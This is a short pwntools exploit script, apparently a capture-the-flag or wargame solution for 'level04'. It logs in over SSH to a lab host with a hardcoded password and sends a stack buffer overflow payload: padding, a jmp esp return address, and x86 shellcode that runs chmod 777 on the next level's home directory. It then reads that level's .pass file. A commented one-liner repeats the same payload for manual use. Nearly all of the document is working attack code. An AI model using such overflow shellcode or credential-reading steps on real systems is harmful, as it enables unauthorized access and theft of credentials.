from pwn import *

### Some information ###

# libc      @ 0xf7e2c000
# jmp esp   @ 0xf7e2ea55
# offset    @ 156

s = ssh(host="192.168.1.3", port=4242, user="level04", password="kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf")
p = s.process("/home/users/level04/./level04")


# --> chmod 777 /home/users//level05
shellcode = b'\x31\xC0\x50\x68\x65\x6C\x30\x35\x68\x2F\x6C\x65\x76\x68\x65\x72\x73\x2F\x68\x65\x2F\x75\x73\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x66\xB9\xFF\x01\xB0\x0F\xCD\x80\x31\xC0\x40\xCD\x80'


payload = b''
payload += b'A' * 156
payload += b'\x55\xea\xe2\xf7'
payload += shellcode

p.sendline(payload)

p2 = s.process(["/bin/cat", "/home/users/level05/.pass"])
p2.interactive()

### MANUAL EXPLOITATION ###

# python -c "print('A' * 156 + '\x55\xea\xe2\xf7' + '\x31\xC0\x50\x68\x65\x6C\x30\x35\x68\x2F\x6C\x65\x76\x68\x65\x72\x73\x2F\x68\x65\x2F\x75\x73\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x66\xB9\xFF\x01\xB0\x0F\xCD\x80\x31\xC0\x40\xCD\x80')" > /tmp/payload
# ./level04 < /tmp/payload
# cat /home/users/level05/.pass
